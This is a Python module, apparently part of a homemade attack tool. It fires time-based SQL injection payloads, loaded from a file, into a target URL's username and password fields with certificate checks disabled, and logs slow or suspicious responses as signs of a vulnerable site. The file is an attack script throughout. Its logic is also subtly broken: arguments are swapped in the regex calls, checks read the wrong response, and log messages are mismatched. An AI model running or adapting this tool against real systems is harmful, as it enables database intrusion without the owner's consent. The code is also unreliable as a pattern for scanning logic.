import os
import asyncio
import re
import requests
from colorama import Fore,init
from datetime import datetime
# from database import create_database_for_Captures
import sqlite3
import time
import logging
from packages import *


attack_type = "Time based SQL injection"

pattern = r"\berror\b"
htmlpattern = r"\bid\b"
time_based_injection_capture = []

""" 
              Reference : https://github.com/payloadbox/sql-injection-payload-list 
              for The payloads"""





async def Time_based_sql_injection(urls):
    """This injection if when the attacker can manipulate the timing of SQL queries and extract the data out of database. """
    try:
        global pattern,htmlpattern
        done = False
        filename = "Time_based_sql.txt"
        current_directory = os.path.dirname(os.path.abspath(__file__))
        file_path = os.path.join(current_directory, filename)

        with open(file_path, "r") as file:
            payload = file.read()
            rows = payload.split("\n")
            sorted_rows = sorted(rows)
            sorted_payload = "\n".join(sorted_rows)
            requests.packages.urllib3.disable_warnings()  
            # url = "https://redtiger.labs.overthewire.org/level1.php"
            req = requests.get(url=urls,verify=False)
            if req.status_code == 200:
                ask = input(f"[{datetime.now()}]"+Fore.GREEN + f"Looks like the host is up with the url:{urls} \nDo you want to send the payload to the website? ")
                logger.info(f"Host is up with the status code: {req.status_code}")

                if ask.lower() == "y":
                    for line in sorted_payload.split("\n"):
                        params = {
                            "username": line,
                            "password": line
                        }
                        start = time.time()
                        ack = requests.post(url=urls, data=params,verify=False)
                        end = time.time()
                        total_time = end - start
                        if total_time > 5.0:
                            logger.info("Server might be vulnerable")
                        logger.info(f"current payload: {line}")
                        await asyncio.sleep(5)
                        if "error" in ack.text:
                            logger.info(f"Could find parameter Error, keyword:{line}")
                            Detect(ack.text)
                            await asyncio.sleep(3)
                            
                            
                        vuln = re.findall(ack.text,pattern,flags=re.IGNORECASE)
                        htmlVULN = re.findall(ack.text,htmlpattern,flags=re.IGNORECASE)
                        if vuln:
                            logger.info(f"Could find id parameter, keyword:{line}")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                        
                        if htmlVULN:
                            logger.info(f"Could find Error parameter, keyword:{line}")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                        
                        word = "id" in req.text
                        errword = "error" in req.text
                        if word:
                            logger.info(f"Could find parameter id, keyword:{line}")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                        
                        if errword:
                            logger.info(f"Could find parameter error, keyword:{line}")
                            await asyncio.sleep(3)
                            Detect(ack.text)
                            
                        
                            
                    if req.status_code == 302:
                        logger.info(f"Could inject the injectable are to the website,keyword:{line}")
                        
                        
                    if "Admin" in vuln or "admin" in vuln or "Admin" in ack.text or "admin" in ack.text or "Admin" in htmlVULN or "admin" in htmlVULN:
                        logger.info(f"Could find parameter admin,keyword:{line},target:{urls}")

                        
                else:
                    pass
                
            else:
                logger.info(f"Host is down.")
                
                        
                    
    except Exception as e:
        print(f"[{datetime.now()}]",e)
        logging.error(f"Error:{e},time:{datetime.now()},attack:{attack_type}")
 
        
    except KeyboardInterrupt as e:
        logger.info("Aborted by keyboard interrupt")
    
    
    except UnicodeEncodeError:
        pass
    
    except Exception as e:
        logger.error(e)
        
 
    finally:
        logger.info("Done")

        
# asyncio.run(Time_based_sql_injection("https://redtiger.labs.overthewire.org/level1.php"))